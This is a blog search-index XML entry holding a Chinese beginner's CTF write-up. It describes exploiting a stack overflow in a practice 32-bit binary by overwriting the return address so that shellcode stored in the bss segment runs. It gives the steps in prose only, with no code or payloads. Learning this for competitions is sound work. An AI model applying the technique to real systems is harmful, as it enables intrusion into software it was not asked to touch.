  </entry>
  <entry>
    <title><![CDATA[pwn简单栈溢出]]></title>
    <url>%2F2018%2F11%2F30%2Fpwn%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA%2F</url>
    <content type="text"><![CDATA[作为队伍里稍微会一点逆向的小白，开坑pwn也确实遇到了许多问题，暴露出很多基础知识的欠缺，直至编写本文时，编者从未在任何比赛中触碰过pwn，更多的时候是对pwn深深的“恐惧”，这也是许多人的通病，也导致精通pwn的人都被业界称为“pwn爷爷”甚至“pwn祖宗”，可见pwn在ctf领域中是一座冰山，很少有人触及，小编由于在最近的几场比赛中深深被pwn拖了后腿，因此决定在闲暇之余会一会这座“冰山”,以后的几期中，小编将记录下自己学习的历程，希望能在二进制这方面有所收获，也希望正在阅读本文的你能绕过小编踩过的坑。 今天记录一下开坑的第一个程序，虽然程序很简单，但是收获了不少东西 首先我们拿到一个名为icecream的Linux下可执行ELF文件，用file命令查看文件属性 可以看到这是一个32位程序 接着我们检查一下程序开启了哪些保护措施 接下来我们来运行程序 程序很简单，给了我们一个输入点 ，这其实是一个最简单的溢出问题，如果有接触过c语言的小伙伴们在编写程序时，当一个输入点超出了接收函数的处理范围，就会造成诸如卡死、闪退、乱码的情况。而本例的思路也很常规，即通过可控输入点，令输入字符串长度足以覆写掉函数返回地址（EIP），使得函数执行完毕后自动跳转到我们需要其跳转到的地址，这样我们就可以执行我们的shellcode,pwn掉程序。 下面我们来判断一下输入点距离EIP需要填充多少个字符串 运行程序 运行到输入点，输入刚刚生成的字符串 提示了无效的返回地址 这样我们就得到了返回地址，下面计算一下输入点到EIP的偏移量 我们需要将shellcode保存到bss段中，bss段的地址可以在ida中查看 可以看到执行shellcode成功]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
</search>
